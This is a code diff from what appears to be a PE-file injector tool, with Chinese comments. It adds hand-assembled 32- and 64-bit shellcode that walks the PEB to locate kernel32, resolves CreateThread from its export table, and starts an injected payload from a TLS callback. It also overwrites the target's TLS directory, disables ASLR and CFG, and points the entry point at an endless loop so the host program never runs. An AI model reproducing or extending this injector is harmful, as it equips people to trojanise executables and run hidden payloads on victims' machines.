@@ -24,6 +24,11 @@ inline uint32_t AlignUp(uint32_t value, uint32_t alignment) {
     return (value + alignment - 1) / alignment * alignment;
 }
 
+inline size_t AlignUp(size_t value, size_t alignment) {
+    if (alignment == 0) return value;
+    return (value + alignment - 1) / alignment * alignment;
+}
+
 // PE 内存视图：封装 32/64 位头部差异访问
 struct PeMap {
     IMAGE_DOS_HEADER* dos = nullptr;
@@ -230,77 +235,168 @@ std::vector<uint8_t> BuildOepTrampoline(bool is64, uint32_t trampolineRva, uint3
     return stub;
 }
 
-// 构造 TLS 回调 Wrapper：仅在 DLL_PROCESS_ATTACH 执行一次，保护寄存器与栈，安全平栈返回
+// 构造 TLS 回调 Wrapper：动态解析 kernel32!CreateThread，在独立线程中异步拉起载荷，回调立即返回，彻底避免加载器锁死锁 (Loader Lock Deadlock)
 std::vector<uint8_t> BuildTlsWrapper(bool is64, uint32_t wrapperRva, uint32_t payloadRva, uint32_t flagRva, uint64_t imageBase) {
     std::vector<uint8_t> stub;
     if (is64) {
         stub = {
-            0x83, 0xFA, 0x01,                   // 0: cmp edx, 1
-            0x75, 0x00,                         // 3: jne .exit (rel8 at 4)
-            0x48, 0x8D, 0x05, 0, 0, 0, 0,       // 5: lea rax, [rip + disp32] (disp at 8)
-            0x80, 0x38, 0x00,                   // 12: cmp byte ptr [rax], 0
-            0x75, 0x00,                         // 15: jne .exit (rel8 at 16)
-            0xC6, 0x00, 0x01,                   // 17: mov byte ptr [rax], 1
-            0x9C,                               // 20: pushfq
-            0x50, 0x51, 0x52, 0x53,             // 21: push rax, rcx, rdx, rbx
-            0x55, 0x56, 0x57,                   // 25: push rbp, rsi, rdi
-            0x41, 0x50, 0x41, 0x51,             // 28: push r8, r9
-            0x41, 0x52, 0x41, 0x53,             // 32: push r10, r11
-            0x41, 0x54, 0x41, 0x55,             // 36: push r12, r13
-            0x41, 0x56, 0x41, 0x57,             // 40: push r14, r15
-            0x48, 0x89, 0xE5,                   // 44: mov rbp, rsp
-            0x48, 0x83, 0xE4, 0xF0,             // 47: and rsp, -16
-            0x48, 0x83, 0xEC, 0x20,             // 51: sub rsp, 32
-            0xE8, 0, 0, 0, 0,                   // 55: call payload (rel32 at 56)
-            0x48, 0x89, 0xEC,                   // 60: mov rsp, rbp
-            0x41, 0x5F, 0x41, 0x5E,             // 63: pop r15, r14
-            0x41, 0x5D, 0x41, 0x5C,             // 67: pop r13, r12
-            0x41, 0x5B, 0x41, 0x5A,             // 71: pop r11, r10
-            0x41, 0x59, 0x41, 0x58,             // 75: pop r9, r8
-            0x5F, 0x5E, 0x5D,                   // 79: pop rdi, rsi, rbp
-            0x5B, 0x5A, 0x59, 0x58,             // 82: pop rbx, rdx, rcx, rax
-            0x9D,                               // 86: popfq
-            0xC3                                // 87: ret (.exit)
+            0x83, 0xFA, 0x01,                                     // 0x00: cmp edx, 1 (DLL_PROCESS_ATTACH)
+            0x0F, 0x85, 0xD7, 0x00, 0x00, 0x00,                   // 0x03: jne ExitStub (0xE0)
+            0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,             // 0x09: lea rax, [rip + flagDisp] (disp at 0x0C)
+            0x80, 0x38, 0x00,                                     // 0x10: cmp byte ptr [rax], 0
+            0x0F, 0x85, 0xC7, 0x00, 0x00, 0x00,                   // 0x13: jne ExitStub (0xE0)
+            0xC6, 0x00, 0x01,                                     // 0x19: mov byte ptr [rax], 1
+            0x53,                                                 // 0x1C: push rbx
+            0x56,                                                 // 0x1D: push rsi
+            0x57,                                                 // 0x1E: push rdi
+            0x41, 0x54,                                           // 0x1F: push r12
+            0x41, 0x55,                                           // 0x21: push r13
+            0x41, 0x56,                                           // 0x23: push r14
+            0x41, 0x57,                                           // 0x25: push r15
+            0x48, 0x83, 0xEC, 0x48,                               // 0x27: sub rsp, 0x48
+            0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, // 0x2B: mov rax, gs:[0x60] (PEB)
+            0x48, 0x8B, 0x40, 0x18,                               // 0x34: mov rax, [rax + 0x18] (PEB->Ldr)
+            0x48, 0x8B, 0x70, 0x10,                               // 0x38: mov rsi, [rax + 0x10] (InLoadOrderModuleList)
+            0x48, 0x8B, 0x36,                                     // 0x3C: mov rsi, [rsi] (2nd: ntdll)
+            0x48, 0x8B, 0x36,                                     // 0x3F: mov rsi, [rsi] (3rd: kernel32)
+            0x48, 0x8B, 0x5E, 0x30,                               // 0x42: mov rbx, [rsi + 0x30] (kernel32 DllBase)
+            0x8B, 0x43, 0x3C,                                     // 0x46: mov eax, [rbx + 0x3C] (e_lfanew)
+            0x8B, 0x94, 0x03, 0x88, 0x00, 0x00, 0x00,             // 0x49: mov edx, [rbx + rax + 0x88] (Export Dir RVA)
+            0x48, 0x03, 0xD3,                                     // 0x50: add rdx, rbx (Export Dir VA)
+            0x8B, 0x4A, 0x18,                                     // 0x53: mov ecx, [rdx + 0x18] (NumberOfNames)
+            0x44, 0x8B, 0x42, 0x20,                               // 0x56: mov r8d, [rdx + 0x20] (AddressOfNames RVA)
+            0x4C, 0x03, 0xC3,                                     // 0x5A: add r8, rbx
+            0x44, 0x8B, 0x4A, 0x24,                               // 0x5D: mov r9d, [rdx + 0x24] (AddressOfNameOrdinals RVA)
+            0x4C, 0x03, 0xCB,                                     // 0x61: add r9, rbx
+            0x44, 0x8B, 0x52, 0x1C,                               // 0x64: mov r10d, [rdx + 0x1C] (AddressOfFunctions RVA)
+            0x4C, 0x03, 0xD3,                                     // 0x68: add r10, rbx
+            0x33, 0xFF,                                           // 0x6B: xor edi, edi (index = 0)
+            // SearchLoop: (0x6D)
+            0x3B, 0xF9,                                           // 0x6D: cmp edi, ecx
+            0x73, 0x5D,                                           // 0x6F: jae FailExit (0xCE)
+            0x41, 0x8B, 0x34, 0xB8,                               // 0x71: mov esi, [r8 + rdi*4] (Name RVA)
+            0x48, 0x03, 0xF3,                                     // 0x75: add rsi, rbx
+            0x48, 0x8B, 0x06,                                     // 0x78: mov rax, [rsi]
+            0x49, 0xBB, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x68, // 0x7B: mov r11, 'CreateTh'
+            0x49, 0x3B, 0xC3,                                     // 0x85: cmp rax, r11
+            0x75, 0x40,                                           // 0x88: jne NextName (0xCA)
+            0x8B, 0x46, 0x08,                                     // 0x8A: mov eax, [rsi + 8]
+            0x3D, 0x72, 0x65, 0x61, 0x64,                         // 0x8D: cmp eax, 'read' (0x64616572)
+            0x75, 0x36,                                           // 0x92: jne NextName (0xCA)
+            0x80, 0x7E, 0x0C, 0x00,                               // 0x94: cmp byte ptr [rsi + 12], 0
+            0x75, 0x30,                                           // 0x98: jne NextName (0xCA)
+            // Found CreateThread!
+            0x41, 0x0F, 0xB7, 0x04, 0x79,                         // 0x9A: movzx eax, word ptr [r9 + rdi*2] (Ordinal)
+            0x41, 0x8B, 0x04, 0x82,                               // 0x9F: mov eax, [r10 + rax*4] (Func RVA)
+            0x48, 0x03, 0xC3,                                     // 0xA3: add rax, rbx (CreateThread VA)
+            0x4C, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,             // 0xA6: lea r8, [rip + payloadDisp] (disp at 0xA9)
+            0x33, 0xC9,                                           // 0xAD: xor ecx, ecx
+            0x33, 0xD2,                                           // 0xAF: xor edx, edx
+            0x4D, 0x33, 0xC9,                                     // 0xB1: xor r9, r9
+            0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, // 0xB4: mov qword ptr [rsp + 0x20], 0
+            0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, // 0xBD: mov qword ptr [rsp + 0x28], 0
+            0xFF, 0xD0,                                           // 0xC6: call rax (CreateThread)
+            0xEB, 0x07,                                           // 0xC8: jmp Epilogue (0xD1)
+            // NextName: (0xCA)
+            0xFF, 0xC7,                                           // 0xCA: inc edi
+            0xEB, 0x9F,                                           // 0xCC: jmp SearchLoop (0x6D)
+            // FailExit: (0xCE)
+            0x48, 0x33, 0xC0,                                     // 0xCE: xor rax, rax
+            // Epilogue: (0xD1)
+            0x48, 0x83, 0xC4, 0x48,                               // 0xD1: add rsp, 0x48
+            0x41, 0x5F,                                           // 0xD5: pop r15
+            0x41, 0x5E,                                           // 0xD7: pop r14
+            0x41, 0x5D,                                           // 0xD9: pop r13
+            0x41, 0x5C,                                           // 0xDB: pop r12
+            0x5F,                                                 // 0xDD: pop rdi
+            0x5E,                                                 // 0xDE: pop rsi
+            0x5B,                                                 // 0xDF: pop rbx
+            // ExitStub: (0xE0)
+            0xC3                                                  // 0xE0: ret
         };
 
-        const int exitIdx = static_cast<int>(stub.size()) - 1; // 87
-        stub[4] = static_cast<uint8_t>(exitIdx - 5);           // rel to ret from jne at 3
-        stub[16] = static_cast<uint8_t>(exitIdx - 17);         // rel to ret from jne at 15
+        const int32_t flagDisp = static_cast<int32_t>(flagRva - (wrapperRva + 0x09 + 7));
+        for (int i = 0; i < 4; ++i) stub[0x0C + i] = static_cast<uint8_t>((flagDisp >> (i * 8)) & 0xFF);
 
-        const int32_t flagDisp = static_cast<int32_t>(flagRva - (wrapperRva + 12));
-        for (int i = 0; i < 4; ++i) stub[8 + i] = static_cast<uint8_t>((flagDisp >> (i * 8)) & 0xFF);
-
-        const int32_t callRel32 = static_cast<int32_t>(payloadRva - (wrapperRva + 60));
-        for (int i = 0; i < 4; ++i) stub[56 + i] = static_cast<uint8_t>((callRel32 >> (i * 8)) & 0xFF);
+        const int32_t payloadDisp = static_cast<int32_t>(payloadRva - (wrapperRva + 0xA6 + 7));
+        for (int i = 0; i < 4; ++i) stub[0xA9 + i] = static_cast<uint8_t>((payloadDisp >> (i * 8)) & 0xFF);
     } else {
         stub = {
-            0x8B, 0x44, 0x24, 0x08,             // 0: mov eax, [esp + 8] (Reason)
-            0x83, 0xF8, 0x01,                   // 4: cmp eax, 1
-            0x75, 0x00,                         // 7: jne .exit (rel8 at 8)
-            0xA1, 0, 0, 0, 0,                   // 9: mov eax, [flag_va] (disp at 10)
-            0x85, 0xC0,                         // 14: test eax, eax
-            0x75, 0x00,                         // 16: jne .exit (rel8 at 17)
-            0xC7, 0x05, 0, 0, 0, 0, 1, 0, 0, 0, // 18: mov dword ptr [flag_va], 1 (addr at 20)
-            0x9C,                               // 28: pushfd
-            0x60,                               // 29: pushad
-            0xE8, 0, 0, 0, 0,                   // 30: call payload (rel32 at 31)
-            0x61,                               // 35: popad
-            0x9D,                               // 36: popfd
-            0xC2, 0x0C, 0x00                    // 37: ret 0x0C (.exit)
+            0x8B, 0x44, 0x24, 0x08,                               // 0x00: mov eax, [esp + 8] (Reason)
+            0x83, 0xF8, 0x01,                                     // 0x04: cmp eax, 1
+            0x0F, 0x85, 0x97, 0x00, 0x00, 0x00,                   // 0x07: jne ExitStub (0xA4)
+            0xB8, 0x00, 0x00, 0x00, 0x00,                         // 0x0D: mov eax, offset RunFlag (addr at 0x0E)
+            0x80, 0x38, 0x00,                                     // 0x12: cmp byte ptr [eax], 0
+            0x0F, 0x85, 0x89, 0x00, 0x00, 0x00,                   // 0x15: jne ExitStub (0xA4)
+            0xC6, 0x00, 0x01,                                     // 0x1B: mov byte ptr [eax], 1
+            0x53,                                                 // 0x1E: push ebx
+            0x56,                                                 // 0x1F: push esi
+            0x57,                                                 // 0x20: push edi
+            0x55,                                                 // 0x21: push ebp
+            0x64, 0xA1, 0x30, 0x00, 0x00, 0x00,                   // 0x22: mov eax, fs:[0x30] (PEB)
+            0x8B, 0x40, 0x0C,                                     // 0x28: mov eax, [eax + 0x0C] (PEB->Ldr)
+            0x8B, 0x70, 0x0C,                                     // 0x2B: mov esi, [eax + 0x0C] (InLoadOrderModuleList)
+            0x8B, 0x36,                                           // 0x2E: mov esi, [esi] (2nd: ntdll)
+            0x8B, 0x36,                                           // 0x30: mov esi, [esi] (3rd: kernel32)
+            0x8B, 0x5E, 0x18,                                     // 0x32: mov ebx, [esi + 0x18] (kernel32 DllBase)
+            0x8B, 0x43, 0x3C,                                     // 0x35: mov eax, [ebx + 0x3C] (e_lfanew)
+            0x8B, 0x54, 0x03, 0x78,                               // 0x38: mov edx, [ebx + eax + 0x78] (Export Dir RVA)
+            0x03, 0xD3,                                           // 0x3C: add edx, ebx (Export Dir VA)
+            0x8B, 0x4A, 0x18,                                     // 0x3E: mov ecx, [edx + 0x18] (NumberOfNames)
+            0x8B, 0x72, 0x20,                                     // 0x41: mov esi, [edx + 0x20] (AddressOfNames RVA)
+            0x03, 0xF3,                                           // 0x44: add esi, ebx
+            0x8B, 0x7A, 0x24,                                     // 0x46: mov edi, [edx + 0x24] (AddressOfNameOrdinals RVA)
+            0x03, 0xFB,                                           // 0x49: add edi, ebx
+            0x8B, 0x6A, 0x1C,                                     // 0x4B: mov ebp, [edx + 0x1C] (AddressOfFunctions RVA)
+            0x03, 0xEB,                                           // 0x4E: add ebp, ebx
+            0x33, 0xC0,                                           // 0x50: xor eax, eax (index = 0)
+            // SearchLoop: (0x52)
+            0x3B, 0xC1,                                           // 0x52: cmp eax, ecx
+            0x73, 0x48,                                           // 0x54: jae FailExit (0x9E)
+            0x52,                                                 // 0x56: push edx
+            0x8B, 0x14, 0x86,                                     // 0x57: mov edx, [esi + eax*4] (Name RVA)
+            0x03, 0xD3,                                           // 0x5A: add edx, ebx
+            0x81, 0x3A, 0x43, 0x72, 0x65, 0x61,                   // 0x5C: cmp dword ptr [edx], 'Crea'
+            0x75, 0x36,                                           // 0x62: jne NextName (0x9A)
+            0x81, 0x7A, 0x04, 0x74, 0x65, 0x54, 0x68,             // 0x64: cmp dword ptr [edx + 4], 'teTh'
+            0x75, 0x2D,                                           // 0x6B: jne NextName (0x9A)
+            0x81, 0x7A, 0x08, 0x72, 0x65, 0x61, 0x64,             // 0x6D: cmp dword ptr [edx + 8], 'read'
+            0x75, 0x24,                                           // 0x74: jne NextName (0x9A)
+            0x80, 0x7A, 0x0C, 0x00,                               // 0x76: cmp byte ptr [edx + 12], 0
+            0x75, 0x1E,                                           // 0x7A: jne NextName (0x9A)
+            // Found:
+            0x5A,                                                 // 0x7C: pop edx
+            0x0F, 0xB7, 0x04, 0x47,                               // 0x7D: movzx eax, word ptr [edi + eax*2] (Ordinal)
+            0x8B, 0x44, 0x85, 0x00,                               // 0x81: mov eax, [ebp + eax*4] (Func RVA)
+            0x03, 0xC3,                                           // 0x85: add eax, ebx (CreateThread VA)
+            0x6A, 0x00,                                           // 0x87: push 0
+            0x6A, 0x00,                                           // 0x89: push 0
+            0x6A, 0x00,                                           // 0x8B: push 0
+            0x68, 0x00, 0x00, 0x00, 0x00,                         // 0x8D: push PayloadVA (addr at 0x8E)
+            0x6A, 0x00,                                           // 0x92: push 0
+            0x6A, 0x00,                                           // 0x94: push 0
+            0xFF, 0xD0,                                           // 0x96: call eax (CreateThread)
+            0xEB, 0x06,                                           // 0x98: jmp Epilogue (0xA0)
+            // NextName: (0x9A)
+            0x5A,                                                 // 0x9A: pop edx
+            0x40,                                                 // 0x9B: inc eax
+            0xEB, 0xB4,                                           // 0x9C: jmp SearchLoop (0x52)
+            // FailExit: (0x9E)
+            0x33, 0xC0,                                           // 0x9E: xor eax, eax
+            // Epilogue: (0xA0)
+            0x5D,                                                 // 0xA0: pop ebp
+            0x5F,                                                 // 0xA1: pop edi
+            0x5E,                                                 // 0xA2: pop esi
+            0x5B,                                                 // 0xA3: pop ebx
+            // ExitStub: (0xA4)
+            0xC2, 0x0C, 0x00                                      // 0xA4: ret 0x0C
         };
 
-        const int exitIdx = static_cast<int>(stub.size()) - 3; // 37
-        stub[8] = static_cast<uint8_t>(exitIdx - 9);
-        stub[17] = static_cast<uint8_t>(exitIdx - 18);
-
         const uint32_t flagVa = static_cast<uint32_t>(imageBase + flagRva);
-        for (int i = 0; i < 4; ++i) {
-            stub[10 + i] = static_cast<uint8_t>((flagVa >> (i * 8)) & 0xFF);
-            stub[20 + i] = static_cast<uint8_t>((flagVa >> (i * 8)) & 0xFF);
-        }
+        for (int i = 0; i < 4; ++i) stub[0x0E + i] = static_cast<uint8_t>((flagVa >> (i * 8)) & 0xFF);
 
-        const int32_t callRel32 = static_cast<int32_t>(payloadRva - (wrapperRva + 35));
-        for (int i = 0; i < 4; ++i) stub[31 + i] = static_cast<uint8_t>((callRel32 >> (i * 8)) & 0xFF);
+        const uint32_t payloadVa = static_cast<uint32_t>(imageBase + payloadRva);
+        for (int i = 0; i < 4; ++i) stub[0x8E + i] = static_cast<uint8_t>((payloadVa >> (i * 8)) & 0xFF);
     }
     return stub;
 }
@@ -757,9 +853,12 @@ bool PePatcher::InjectByTlsCallback(std::vector<uint8_t>& buf, const std::vector
     const bool is64 = m.is64;
     const uint32_t ptrSize = is64 ? 8 : 4;
     const uint32_t tlsStructSize = is64 ? sizeof(IMAGE_TLS_DIRECTORY64) : sizeof(IMAGE_TLS_DIRECTORY32);
+    const size_t stubSize = is64 ? 225 : 167; // BuildTlsWrapper 生成的跳板尺寸
+    const size_t oepStubSize = 2;              // 0xEB, 0xFE (jmp $) 主线程防崩存活指令
 
-    // 布局: [TLS 目录][对齐填充][回调数组: 2个指针][TLS 索引变量: ptrSize 字节][载荷代码]
-    const size_t needed = AlignUp(tlsStructSize, 16) + 2 * ptrSize + ptrSize + payload.size() + 16;
+    // 布局: [TLS 目录][对齐填充][回调数组: 2个指针][TLS 索引变量: ptrSize 字节][RunFlag 变量: 4 字节][TLS 异步跳板 Stub][OEP 存活 Stub: 2 字节][载荷代码]
+    const size_t needed = AlignUp(tlsStructSize, 16) + 2 * ptrSize + ptrSize + 4 + 16 +
+                         AlignUp(stubSize, 16) + AlignUp(oepStubSize, 16) + payload.size() + 64;
     uint32_t baseOff = 0;
     uint32_t baseRVA = 0;
     // WRITE: AddressOfIndex 由加载器写入索引值，所在节必须可写
@@ -769,13 +868,19 @@ bool PePatcher::InjectByTlsCallback(std::vector<uint8_t>& buf, const std::vector
     }
 
     const uint32_t dirOff = baseOff;
-    const uint32_t cbArrOff = dirOff + AlignUp(tlsStructSize, 16);
+    const uint32_t cbArrOff = AlignUp(dirOff + tlsStructSize, 16);
     const uint32_t indexOff = cbArrOff + 2 * ptrSize;
-    const uint32_t payOff = indexOff + ptrSize;
+    const uint32_t flagOff = indexOff + ptrSize;
+    const uint32_t stubOff = AlignUp(flagOff + 4, 16);
+    const uint32_t oepOff = AlignUp(stubOff + static_cast<uint32_t>(stubSize), 16);
+    const uint32_t payOff = AlignUp(oepOff + static_cast<uint32_t>(oepStubSize), 16);
 
     const uint32_t dirRVA = baseRVA + (dirOff - baseOff);
     const uint32_t cbArrRVA = baseRVA + (cbArrOff - baseOff);
     const uint32_t idxRVA = baseRVA + (indexOff - baseOff);
+    const uint32_t flagRVA = baseRVA + (flagOff - baseOff);
+    const uint32_t stubRVA = baseRVA + (stubOff - baseOff);
+    const uint32_t oepRVA = baseRVA + (oepOff - baseOff);
     const uint32_t payRVA = baseRVA + (payOff - baseOff);
 
     // ExpandLastSection 重新分配了 buffer，重新映射
@@ -788,6 +893,12 @@ bool PePatcher::InjectByTlsCallback(std::vector<uint8_t>& buf, const std::vector
     DisableAslrAndCfg(m2, false);
     const uint64_t imageBase = m2.ImageBase();
 
+    // 构造异步拉起跳板 Stub
+    auto tlsStub = BuildTlsWrapper(is64, stubRVA, payRVA, flagRVA, imageBase);
+
+    // 重设入口点到安全存活点，避免加载器执行原宿主受损代码崩溃
+    m2.SetEntryPoint(oepRVA);
+
     if (is64) {
         auto* dir = reinterpret_cast<IMAGE_TLS_DIRECTORY64*>(buf.data() + dirOff);
         dir->StartAddressOfRawData = 0;
@@ -797,7 +908,7 @@ bool PePatcher::InjectByTlsCallback(std::vector<uint8_t>& buf, const std::vector
         dir->SizeOfZeroFill = 0;
         dir->Characteristics = 0;
         auto* callbacks = reinterpret_cast<uint64_t*>(buf.data() + cbArrOff);
-        callbacks[0] = imageBase + payRVA;
+        callbacks[0] = imageBase + stubRVA; // 指向异步跳板 Stub
         callbacks[1] = 0;
     } else {
         auto* dir = reinterpret_cast<IMAGE_TLS_DIRECTORY32*>(buf.data() + dirOff);
@@ -808,10 +919,15 @@ bool PePatcher::InjectByTlsCallback(std::vector<uint8_t>& buf, const std::vector
         dir->SizeOfZeroFill = 0;
         dir->Characteristics = 0;
         auto* callbacks = reinterpret_cast<DWORD*>(buf.data() + cbArrOff);
-        callbacks[0] = static_cast<DWORD>(imageBase + payRVA);
+        callbacks[0] = static_cast<DWORD>(imageBase + stubRVA); // 指向异步跳板 Stub
         callbacks[1] = 0;
     }
+
     std::memset(buf.data() + indexOff, 0, ptrSize);
+    std::memset(buf.data() + flagOff, 0, 4);
+    std::memcpy(buf.data() + stubOff, tlsStub.data(), tlsStub.size());
+    buf[oepOff] = 0xEB; // jmp $ (防崩存活循环)
+    buf[oepOff + 1] = 0xFE;
     std::memcpy(buf.data() + payOff, payload.data(), payload.size());
 
     IMAGE_DATA_DIRECTORY* tlsDir2 = m2.DataDir(IMAGE_DIRECTORY_ENTRY_TLS);
@@ -819,8 +935,8 @@ bool PePatcher::InjectByTlsCallback(std::vector<uint8_t>& buf, const std::vector
     tlsDir2->Size = tlsStructSize;
 
     Log(CUI::LogLevel::Success, "Patch", std::format(
-        "TLS 回调已注册{} (回调数组 RVA 0x{:X}，载荷 RVA 0x{:X})",
-        hadTls ? "，原 TLS 目录已被覆盖" : "", cbArrRVA, payRVA));
+        "TLS 回调已注册{} (异步跳板 RVA 0x{:X}，载荷 RVA 0x{:X})",
+        hadTls ? "，原 TLS 目录已被覆盖" : "", stubRVA, payRVA));
     return true;
 }
 
